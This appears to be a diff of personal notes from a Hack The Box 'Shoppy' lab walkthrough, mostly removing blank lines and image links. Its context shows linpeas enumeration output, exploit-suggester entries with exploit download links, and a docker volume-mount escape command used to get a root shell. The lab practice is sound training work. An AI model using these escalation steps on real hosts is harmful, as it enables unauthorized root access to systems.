@@ -130,7 +130,6 @@ Nmap done: 1 IP address (1 host up) scanned in 14.56 seconds
 ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
 
-
 10.10.148.19 webenum.thm
 10.10.148.19 mysubdomain.webenum.thm
 10.10.148.19 learning.webenum.thm
@@ -209,7 +208,6 @@ Found: mattermost.shoppy.htb Status: 200 [Size: 3122]
 ::1     localhost ip6-localhost ip6-loopback
 ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
-
 
 10.10.148.19 webenum.thm
 10.10.148.19 mysubdomain.webenum.thm
@@ -495,7 +493,6 @@ bash: ./linpeas.sh.1: Permission denied
 deploy@shoppy:/tmp$ chmod +x linpeas.sh.1
 deploy@shoppy:/tmp$ ./linpeas.sh.1
 
-
                             ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                     ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
              ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
@@ -578,7 +575,6 @@ Sudo version 1.9.5p2
 ./linpeas.sh.1: 1197: rpm: not found
 ./linpeas.sh.1: 1197: 0: not found
 ./linpeas.sh.1: 1207: [[: not found
-
 
 ╔══════════╣ PATH
 ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses                                                                           
@@ -692,7 +688,6 @@ dmesg Not Found
    Tags: ubuntu=16.04{ntfs-3g:2015.3.14AR.1-1build1},debian=7.0{ntfs-3g:2012.1.15AR.5-2.1+deb7u2},debian=8.0{ntfs-3g:2014.2.15AR.2-1+deb8u2}
    Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/41356.zip
    Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.
-
 
 ╔══════════╣ Executing Linux Exploit Suggester 2
 ╚ https://github.com/jondonas/linux-exploit-suggester-2                          
@@ -822,7 +817,6 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
 47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
 52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
-
 
 SHELL=/bin/sh
 PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
@@ -1022,7 +1016,6 @@ org.gnome.DisplayManager              713 n/a     root             :1.11        
  -- EUID=0 
 org.opensuse.CupsPkHelper.Mechanism     - -       -                (activatable) -    -       -
 
-
                                         ╔═════════════════════╗
 ════════════════════════════════════════╣ Network Information ╠════════════════════════════════════════                                                           
                                         ╚═════════════════════╝                  
@@ -1070,7 +1063,6 @@ lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
         TX packets 25754112  bytes 4116548463 (3.8 GiB)
         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
 
-
 ╔══════════╣ Active Ports
 ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports    
 tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
@@ -1087,7 +1079,6 @@ tcp6       0      0 :::9093                 :::*                    LISTEN      
 ╔══════════╣ Can I sniff with tcpdump?
 No                                                                               
                                                                                  
-
 
                                          ╔═══════════════════╗
 ═════════════════════════════════════════╣ Users Information ╠═════════════════════════════════════════                                                           
@@ -1196,7 +1187,6 @@ deploy           pts/1    10.10.14.241     Tue Nov  8 05:52:33 -0600 2022
 ╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!                                                        
                                                                                  
 
-
                                        ╔══════════════════════╗
 ═══════════════════════════════════════╣ Software Information ╠═══════════════════════════════════════                                                            
                                        ╚══════════════════════╝                  
@@ -1242,7 +1232,6 @@ default_text_search_config = 'pg_catalog.english'
 -rw-r--r-- 1 root root 172 Nov 15  2019 /usr/lib/tmpfiles.d/postgresql.conf
 d /run/postgresql 2775 postgres postgres - -
 d /var/log/postgresql 1775 root postgres - -
-
 
 ═╣ PostgreSQL connection to template0 using postgres/NOPASS ........ No
 ═╣ PostgreSQL connection to template1 using postgres/NOPASS ........ No          
@@ -1330,9 +1319,6 @@ server {
   }
 }
 
-
-
-
 ╔══════════╣ Analyzing FastCGI Files (limit 70)
 -rw-r--r-- 1 root root 1007 Jul 19 09:05 /etc/nginx/fastcgi_params               
 
@@ -1341,11 +1327,9 @@ drwxr-xr-x 2 root root 4096 Jul 22 11:39 /etc/NetworkManager/system-connections
 drwxr-xr-x 2 root root 4096 Jul 22 11:39 /etc/NetworkManager/system-connections
 -rw------- 1 root root 170 Jul 22 11:39 /etc/NetworkManager/system-connections/Wired connection 1                                                                 
 
-
 ╔══════════╣ Analyzing Ldap Files (limit 70)
 The password hash is from the {SSHA} to 'structural'                             
 drwxr-xr-x 2 root root 4096 Jul 22 11:37 /etc/ldap
-
 
 ╔══════════╣ Searching ssl/ssh files
 ChallengeResponseAuthentication no                                               
@@ -1393,7 +1377,6 @@ Subsystem       sftp    /usr/lib/openssh/sftp-server
 ══╣ /etc/hosts.allow file found, trying to read the rules:
 /etc/hosts.allow                                                                 
 
-
 Searching inside /etc/ssh/ssh_config for interesting info
 Include /etc/ssh/ssh_config.d/*.conf
 Host *
@@ -1405,15 +1388,9 @@ Host *
 drwxr-xr-x 2 root root 4096 Sep 12 13:28 /etc/pam.d                              
 -rw-r--r-- 1 root root 2133 Jul  1 17:37 /etc/pam.d/sshd
 
-
-
-
 ╔══════════╣ Analyzing Keyring Files (limit 70)
 drwx------ 2 jaeger jaeger 4096 Aug  9 02:37 /home/jaeger/.local/share/keyrings  
 drwxr-xr-x 2 root root 4096 Jul 22 13:24 /usr/share/keyrings
-
-
-
 
 ╔══════════╣ Searching uncommon passwd files (splunk)
 passwd file: /etc/pam.d/passwd                                                   
@@ -1438,9 +1415,6 @@ drwxr-xr-x 2 jaeger jaeger 4096 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules
 drwxr-xr-x 2 jaeger jaeger 4096 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/resolve/.github
 drwxr-xr-x 2 jaeger jaeger 4096 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/side-channel/.github
 drwxr-xr-x 2 jaeger jaeger 4096 Jul 22 12:06 /home/jaeger/ShoppyApp/node_modules/supports-preserve-symlinks-flag/.github
-
-
-
 
 ╔══════════╣ Analyzing PGP-GPG Files (limit 70)
 /usr/bin/gpg                                                                     
@@ -1508,7 +1482,6 @@ lrwxrwxrwx 1 root root 33 Jul 22 13:25 /etc/systemd/system/sockets.target.wants/
 -rw-r--r-- 1 root root 175 Sep  8 18:09 /usr/lib/systemd/system/docker.socket
 -rw-r--r-- 1 root root 0 Jul 22 13:25 /var/lib/systemd/deb-systemd-helper-enabled/sockets.target.wants/docker.socket
 
-
 ╔══════════╣ Analyzing Interesting logs Files (limit 70)
 -rw-r--r-- 1 root root 430792747 Nov  8 13:03 /var/log/nginx/access.log          
 
@@ -1519,19 +1492,11 @@ lrwxrwxrwx 1 root root 33 Jul 22 13:25 /etc/systemd/system/sockets.target.wants/
 -rw-r--r-- 1 deploy deploy 3526 Mar 27  2022 /home/deploy/.bashrc
 -rw-r--r-- 1 jaeger jaeger 3723 Jul 22 12:05 /home/jaeger/.bashrc
 
-
-
 -rw------- 1 jaeger jaeger 91 Nov  8 10:21 /home/jaeger/.lesshst
-
 
 -rw-r--r-- 1 root root 807 Mar 27  2022 /etc/skel/.profile
 -rw-r--r-- 1 deploy deploy 807 Mar 27  2022 /home/deploy/.profile
 -rw-r--r-- 1 jaeger jaeger 807 Jul 22 11:39 /home/jaeger/.profile
-
-
-
-
-
 
                                          ╔═══════════════════╗
 ═════════════════════════════════════════╣ Interesting Files ╠═════════════════════════════════════════                                                           
@@ -1846,50 +1811,30 @@ Found /var/lib/PackageKit/transactions.db: SQLite 3.x database, last written usi
  -> Extracting tables from /var/lib/colord/storage.db (limit 20)
                                                                                  
 
-
  -> Extracting tables from /var/lib/fwupd/pending.db (limit 20)
                                                                                  
-
-
 
  -> Extracting tables from /var/lib/gdm3/.cache/tracker/meta.db (limit 20)
                                                                                  
 
-
   --> Found interesting column names in nco:Role_nco:hasEmailAddress (output limit 10)                                                                            
 CREATE TABLE "nco:Role_nco:hasEmailAddress" (ID INTEGER NOT NULL, "nco:hasEmailAddress" INTEGER NOT NULL, "nco:hasEmailAddress:graph" INTEGER)
-
-
-
 
   --> Found interesting column names in nco:EmailAddress (output limit 10)
 CREATE TABLE "nco:EmailAddress" (ID INTEGER NOT NULL PRIMARY KEY, "nco:emailAddress" TEXT COLLATE TRACKER UNIQUE, "nco:emailAddress:graph" INTEGER)
 
-
-
-
   --> Found interesting column names in nco:VoicePhoneNumber (output limit 10)
 CREATE TABLE "nco:VoicePhoneNumber" (ID INTEGER NOT NULL PRIMARY KEY, "nco:voiceMail" INTEGER, "nco:voiceMail:graph" INTEGER)
-
-
 
   --> Found interesting column names in nfo:FileDataObject (output limit 10)
 CREATE TABLE "nfo:FileDataObject" (ID INTEGER NOT NULL PRIMARY KEY, "nfo:fileLastAccessed" INTEGER, "nfo:fileLastAccessed:graph" INTEGER, "nfo:fileLastAccessed:localDate" INTEGER, "nfo:fileLastAccessed:localTime" INTEGER, "nfo:fileCreated" INTEGER, "nfo:fileCreated:graph" INTEGER, "nfo:fileCreated:localDate" INTEGER, "nfo:fileCreated:localTime" INTEGER, "nfo:fileSize" INTEGER, "nfo:fileSize:graph" INTEGER, "nfo:permissions" TEXT COLLATE TRACKER, "nfo:permissions:graph" INTEGER, "nfo:fileName" TEXT COLLATE TRACKER, "nfo:fileName:graph" INTEGER, "nfo:hasHash" INTEGER, "nfo:hasHash:graph" INTEGER, "nfo:fileOwner" INTEGER, "nfo:fileOwner:graph" INTEGER, "nfo:fileLastModified" INTEGER, "nfo:fileLastModified:graph" INTEGER, "nfo:fileLastModified:localDate" INTEGER, "nfo:fileLastModified:localTime" INTEGER)
 100003, 1660030067, 100002, 19213, 26867, None, None, None, None, 4096, 100002, None, None, gdm3, 100002, None, None, None, None, 1660030061, 100002, 19213, 26861
 
-
-
   --> Found interesting column names in nfo:FileHash (output limit 10)
 CREATE TABLE "nfo:FileHash" (ID INTEGER NOT NULL PRIMARY KEY, "nfo:hashValue" TEXT COLLATE TRACKER, "nfo:hashValue:graph" INTEGER, "nfo:hashAlgorithm" TEXT COLLATE TRACKER, "nfo:hashAlgorithm:graph" INTEGER)
 
-
-
-
-
   --> Found interesting column names in nfo:ArchiveItem (output limit 10)
 CREATE TABLE "nfo:ArchiveItem" (ID INTEGER NOT NULL PRIMARY KEY, "nfo:isPasswordProtected" INTEGER, "nfo:isPasswordProtected:graph" INTEGER)
-
-
 
   --> Found interesting column names in nmo:Email_nmo:contentMimeType (output limit 10)                                                                           
 CREATE TABLE "nmo:Email_nmo:contentMimeType" (ID INTEGER NOT NULL, "nmo:contentMimeType" TEXT NOT NULL, "nmo:contentMimeType:graph" INTEGER)
@@ -1897,27 +1842,14 @@ CREATE TABLE "nmo:Email_nmo:contentMimeType" (ID INTEGER NOT NULL, "nmo:contentM
   --> Found interesting column names in nmo:Email (output limit 10)
 CREATE TABLE "nmo:Email" (ID INTEGER NOT NULL PRIMARY KEY, "nmo:hasContent" INTEGER, "nmo:hasContent:graph" INTEGER, "nmo:isFlagged" INTEGER, "nmo:isFlagged:graph" INTEGER, "nmo:isRecent" INTEGER, "nmo:isRecent:graph" INTEGER, "nmo:status" TEXT COLLATE TRACKER, "nmo:status:graph" INTEGER, "nmo:responseType" TEXT COLLATE TRACKER, "nmo:responseType:graph" INTEGER)
 
-
-
-
-
   --> Found interesting column names in ncal:UnionParentClass (output limit 10)
 CREATE TABLE "ncal:UnionParentClass" (ID INTEGER NOT NULL PRIMARY KEY, "ncal:lastModified" INTEGER, "ncal:lastModified:graph" INTEGER, "ncal:lastModified:localDate" INTEGER, "ncal:lastModified:localTime" INTEGER, "ncal:trigger" INTEGER, "ncal:trigger:graph" INTEGER, "ncal:created" INTEGER, "ncal:created:graph" INTEGER, "ncal:created:localDate" INTEGER, "ncal:created:localTime" INTEGER, "ncal:url" INTEGER, "ncal:url:graph" INTEGER, "ncal:comment" TEXT COLLATE TRACKER, "ncal:comment:graph" INTEGER, "ncal:summaryAltRep" INTEGER, "ncal:summaryAltRep:graph" INTEGER, "ncal:priority" INTEGER, "ncal:priority:graph" INTEGER, "ncal:location" TEXT COLLATE TRACKER, "ncal:location:graph" INTEGER, "ncal:uid" TEXT COLLATE TRACKER, "ncal:uid:graph" INTEGER, "ncal:requestStatus" INTEGER, "ncal:requestStatus:graph" INTEGER, "ncal:recurrenceId" INTEGER, "ncal:recurrenceId:graph" INTEGER, "ncal:dtstamp" INTEGER, "ncal:dtstamp:graph" INTEGER, "ncal:dtstamp:localDate" INTEGER, "ncal:dtstamp:localTime" INTEGER, "ncal:class" INTEGER, "ncal:class:graph" INTEGER, "ncal:organizer" INTEGER, "ncal:organizer:graph" INTEGER, "ncal:dtend" INTEGER, "ncal:dtend:graph" INTEGER, "ncal:summary" TEXT COLLATE TRACKER, "ncal:summary:graph" INTEGER, "ncal:descriptionAltRep" INTEGER, "ncal:descriptionAltRep:graph" INTEGER, "ncal:commentAltRep" INTEGER, "ncal:commentAltRep:graph" INTEGER, "ncal:sequence" INTEGER, "ncal:sequence:graph" INTEGER, "ncal:contact" TEXT COLLATE TRACKER, "ncal:contact:graph" INTEGER, "ncal:contactAltRep" INTEGER, "ncal:contactAltRep:graph" INTEGER, "ncal:locationAltRep" INTEGER, "ncal:locationAltRep:graph" INTEGER, "ncal:geo" INTEGER, "ncal:geo:graph" INTEGER, "ncal:resourcesAltRep" INTEGER, "ncal:resourcesAltRep:graph" INTEGER, "ncal:dtstart" INTEGER, "ncal:dtstart:graph" INTEGER, "ncal:description" TEXT COLLATE TRACKER, "ncal:description:graph" INTEGER, "ncal:relatedToSibling" TEXT COLLATE TRACKER, "ncal:relatedToSibling:graph" INTEGER, "ncal:duration" INTEGER, "ncal:duration:graph" INTEGER)
-
-
 
   --> Found interesting column names in fts5 (output limit 10)
 CREATE VIRTUAL TABLE fts5 USING fts5(content="fts_view", "nco:phoneNumber", "nfo:fontFamily", "nmm:artistName", "nfo:tableOfContents", "nfo:fileName", "nmo:messageSubject", "nfo:genre", "nmm:genre", "mtp:creator", "nco:title", "nco:emailAddress", "nie:keyword", "nmm:category", "nid3:title", "nid3:albumTitle", "nid3:contentType", "nco:nameFamily", "nco:nameGiven", "nco:nameAdditional", "nco:contactGroupName", "nco:fullname", "nco:nickname", "nco:region", "nco:country", "nco:extendedAddress", "nco:streetAddress", "nco:postalcode", "nco:locality", "nco:county", "nco:district", "nco:pobox", "nco:imID", "nco:imNickname", "ncal:comment", "ncal:location", "ncal:summary", "ncal:contact", "ncal:description", "nie:title", "nie:subject", "nie:plainTextContent", "nie:description", "nie:comment", "nao:prefLabel", "nao:description", "nco:department", "nco:role", "nco:note", "nmm:albumTitle", tokenize=TrackerTokenizer)
 
-
-
-
-
  -> Extracting tables from /var/lib/PackageKit/transactions.db (limit 20)
                                                                                  
-
-
-
 
 ╔══════════╣ Web files?(output limit)
 /var/www/:                                                                       
@@ -2217,7 +2149,6 @@ It can be used to break out from restricted environments by spawning an interact
 
     docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 
-
 deploy@shoppy:/tmp$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 # whoami
 root
@@ -2231,18 +2162,5 @@ submit
 pwnd
 
 ```
-
-![[Pasted image 20221108125216.png]]
-
-![[Pasted image 20221108131810.png]]
-
-![[Pasted image 20221108133628.png]]
-
-![[Pasted image 20221108134120.png]]
-![[Pasted image 20221108134406.png]]
-
-
-
-
 
 [[Unified]]
